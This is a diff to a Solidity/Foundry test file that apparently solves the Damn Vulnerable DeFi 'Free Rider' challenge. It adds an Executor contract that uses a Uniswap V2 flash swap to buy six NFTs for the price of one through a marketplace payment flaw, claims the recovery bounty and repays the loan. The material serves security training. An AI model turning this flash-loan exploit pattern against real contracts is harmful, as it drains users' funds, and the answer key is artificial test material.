@@ -11,6 +11,97 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+contract Executor is IERC721Receiver {
+
+    IUniswapV2Pair pair;
+    IUniswapV2Factory factoryV2;
+    FreeRiderNFTMarketplace marketplace;
+    FreeRiderRecoveryManager recoveryManager;
+    DamnValuableNFT nft;
+    WETH weth;
+    address player;
+    uint256 nftPrice;
+
+    constructor(
+        IUniswapV2Pair _pair,
+        IUniswapV2Factory _factoryV2,
+        FreeRiderNFTMarketplace _marketplace,
+        FreeRiderRecoveryManager _recoveryManager,
+        DamnValuableNFT _nft,
+        WETH _weth,
+        address _player,
+        uint256 _nftPrice
+    ) {
+        pair = _pair;
+        factoryV2 = _factoryV2;
+        marketplace = _marketplace;
+        recoveryManager = _recoveryManager;
+        nft = _nft;
+        weth = _weth;
+        player = _player;
+        nftPrice = _nftPrice;
+    }
+
+    function execute() payable external {
+        uint256 token0AmountOut;
+        uint256 token1AmountOut;
+        address receiver = address(this);
+        bytes memory data = abi.encodePacked(uint256(1));
+
+        if (pair.token0() == address(weth)) {
+            token0AmountOut = nftPrice;
+        } else {
+            token1AmountOut = nftPrice;
+        }
+
+        pair.swap(
+            token0AmountOut,
+            token1AmountOut,
+            receiver,
+            data
+        );
+    }
+
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
+        address token0 = IUniswapV2Pair(msg.sender).token0();
+        address token1 = IUniswapV2Pair(msg.sender).token1();
+        assert(msg.sender == factoryV2.getPair(token0, token1));
+        
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            tokenIds[i] = i;
+        }
+
+        weth.withdraw(nftPrice);
+
+        marketplace.buyMany{value: nftPrice}(tokenIds);
+
+        for (uint256 i = 0; i < 6; i++) {
+            nft.safeTransferFrom(
+                address(this),
+                address(recoveryManager),
+                i,
+                abi.encode(player)
+            );
+        }
+
+        uint256 flashLoanAmount = nftPrice + 0.09 ether;
+        weth.deposit{value: flashLoanAmount}();
+        weth.transfer(msg.sender, flashLoanAmount);
+    }
+
+    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
+        external
+        override
+        returns (bytes4)
+    {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,7 +214,17 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        Executor executor = new Executor(
+            uniswapPair,
+            uniswapV2Factory,
+            marketplace,
+            recoveryManager,
+            nft,
+            weth,
+            player,
+            NFT_PRICE
+        );
+        executor.execute{value: PLAYER_INITIAL_ETH_BALANCE - 1}();
     }
 
     /**
